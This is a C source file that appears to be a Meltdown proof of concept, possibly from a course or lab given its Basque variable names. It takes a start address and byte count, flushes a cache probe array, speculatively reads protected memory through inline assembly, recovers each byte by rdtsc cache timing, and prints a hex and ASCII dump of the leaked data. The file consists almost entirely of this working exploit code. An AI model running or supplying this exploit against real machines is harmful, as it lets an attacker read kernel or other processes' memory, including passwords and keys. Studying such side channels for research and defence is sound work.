#include <stdio.h>
#include <stdint.h>
#include <inttypes.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <signal.h>
#include <setjmp.h>
#include <emmintrin.h>
#include <x86intrin.h>

#define SAIAKERA_KOP 50 // Number of probe iterations to improve measurement accuracy
#define CACHE_HIT_THRESHOLD 80
#define PAGE 4096 // Page size in bytes

void print_address_content(uint64_t address, const uint8_t* data, size_t size);
void print_string(const uint8_t* data, size_t size);
uint8_t meltdown_attack(size_t ptr, uint8_t* probe_array);

// Buffer to store execution context for non-local jumps (used for handling segfaults)
static sigjmp_buf jmpbuf;

// Signal handler for segmentation faults (SIGSEGV)
// Jumps back to the saved execution point in meltdown_attack using siglongjmp
static void segv_handler(int signum){
    siglongjmp(jmpbuf, 1);
}

int main(int argc, char** argv){
    // Register the SIGSEGV handler to catch segmentation faults
    signal(SIGSEGV, segv_handler);
    uint8_t buffer[16];
    uint64_t start_addr = 0;
    uint64_t address, tam = 0;

    if (argc < 2 || argc > 3) {
        printf("Usage: %s <start_address (hex)> <bytes (int)>\n", argv[0]);
        return 0;
    }

    start_addr = strtoull(argv[1], NULL, 16);
    tam = strtoull(argv[2], NULL, 10);

    // Allocate the probe array buffer for cache timing
    uint8_t* probe_array = (uint8_t*)malloc(256 * PAGE);
    if (!probe_array) {
        fprintf(stderr, "malloc failed\n");
        return -1;
    }

    // Leak byte-by-byte from start_addr, storing results in buffer
    for (address = 0; address < tam; address++) {
        buffer[address % 16] = meltdown_attack(start_addr + address, probe_array);
        if ((address+1) % 16 == 0) {
            print_address_content((start_addr + address - 15), buffer, 16);
            print_string(buffer, 16);
        }
    }

    if (tam % 16 != 0) {
        print_address_content((start_addr + tam - tam%16), buffer, tam % 16);
        print_string(buffer, tam % 16);
    }

    free(probe_array);
    return 0;
}

/*
 * meltdown_attack:
 * Tries to leak one byte from the given memory address `ptr` using
 * the Meltdown CPU vulnerability technique.
 *
 * Parameters:
 * - ptr: the target memory address to read from (speculative read)
 * - probe_array: a buffer used to create timing side-channel via cache hits
 *
 * Returns:
 * - The guessed byte value read from the target address.
 */
uint8_t meltdown_attack(size_t ptr, uint8_t* probe_array){
    int j, i, pos_min = 0, leaked_value = 0;
    uint64_t denborak[256]; // Timing measurements for each possible byte value
    uint8_t tests[256];  // Counters for how many times each byte was likely leaked
    volatile uint64_t denb;

    memset(tests, 0, sizeof(tests));

    for (j = 0; j < SAIAKERA_KOP; j++) {
        memset(denborak, 0, sizeof(denborak));
        
        // Flush probe_array from cache
        for (i = 0; i < 256; i++) {
            _mm_clflush(&probe_array[i * PAGE]);
        }
        _mm_mfence(); // Memory fence to enforce ordering

        // Try to read secret
        if (sigsetjmp(jmpbuf, 1) == 0) { // Save execution context
            asm __volatile__ (
                "%=:                              \n" // Meltdown loop
                // Speculative Execution Begins
                "xorq %%rax, %%rax                \n" // Clear RAX
                "movb (%[ptr]), %%al              \n" // Speculative read from protected memory.  This will cause a page fault later
                "shlq $0xc, %%rax                 \n" // Multiply by 4096 (shift left 12 bits). Point to different 4 KB pages in probe_array
                "jz %=b                           \n" // If value was zero , retry ( noisy channel )
                "movq (%[probe_array], %%rax, 1), %%rbx   \n" // Speculative access to probe_array [ value * 4096]. Load a secret - dependent cache line
                :
                : [ptr] "r" (ptr), [probe_array] "r" (probe_array)
                : "%rax", "%rbx");
                // Exception is raised (page fault)!
        }

        // After fault, recover which page is cached
        for (i = 0; i < 256; i++) {
            asm __volatile__ (
                "mfence\n\t"                // Ensure all previous writes have completed
                "lfence\n\t"
                "rdtsc\n\t"                 // Read Time Stamp Counter ( start )
                "shl $32, %%rdx\n\t"        // Shift high bits into position
                "or %%rax, %%rdx\n\t"       // Combine high and low bits into RAX ( start_time )
                "mov %%rdx, %%r8\n\t"       // Save start_time into R8
            
                "lfence\n\t"
                "mov (%%rdi), %%rax\n\t"    //  Access the memory address to test
                "lfence\n\t"
                // Read full 64 - bit timestamp counter before and after memory access,
                // then compute the timing difference to detect cache hits.
                "rdtscp\n\t"                // Read Time Stamp Counter ( end )
                "shl $32, %%rdx\n\t"        // Shift high bits into position
                "or %%rax, %%rdx\n\t"       // Combine high and low bits into RAX ( end_time )
            
                "sub %%r8, %%rdx\n\t"       // Compute time difference ( end_time - start_time )
                "mov %%rdx, %0\n\t"         // Save value
                :
                "=r"(denb)                  // Output
                :
                "D"(&probe_array[i * PAGE]) // Input
                : "%rax", "%rdx", "%r8", "memory"
            );
            denborak[i] = denb;
        }

        // Find the index (byte value) with the smallest access time (cache hit)
        for (i = 0; i < 256; i++) {
            if (denborak[i] < denborak[pos_min] && denborak[i] < CACHE_HIT_THRESHOLD) {
                pos_min = i;
            }
        }
        // Increment the count for the most likely leaked byte value
        tests[pos_min]++;
    }

    // Choose the byte value that appeared most times as the leaked byte
    for (i = 0; i < 256; i++) {
        if (tests[i] > tests[leaked_value]) {
            leaked_value = i;
        }
    }
  
    return (uint8_t)leaked_value;
}

/*
 * Prints a memory address and its contents in hex format,
 * 16 bytes per line, grouped in 8-byte blocks.
 */
void print_address_content(uint64_t address, const uint8_t* data, size_t size){
    printf("0x%016llx | ", (unsigned long long)address);
    for (size_t i = 0; i < size; ++i) {
        printf("%02X ", data[i]);
        if ((i + 1) % 8 == 0) {
            printf(" ");
        }
    }

    if (size < 16) {
        for (size_t i = size; i < 16; ++i) {
            printf("   ");
            if ((i + 1) % 8 == 0) {
                printf(" ");
            }
        }
    }
}

/*
 * Prints the ASCII representation of the given data,
 * replacing non-printable characters with dots.
 */
void print_string(const uint8_t* data, size_t size){
    printf("|  ");
    for (size_t i = 0; i < size; ++i) {
        char c = data[i];
        if (c >= ' ' && c <= '~') {
            putchar(c);
        } else {
            putchar('.');
        }
    }

    if (size < 16) {
        for (size_t i = size; i < 16; ++i) {
            putchar(' ');
        }
    }
    printf("\n");
}
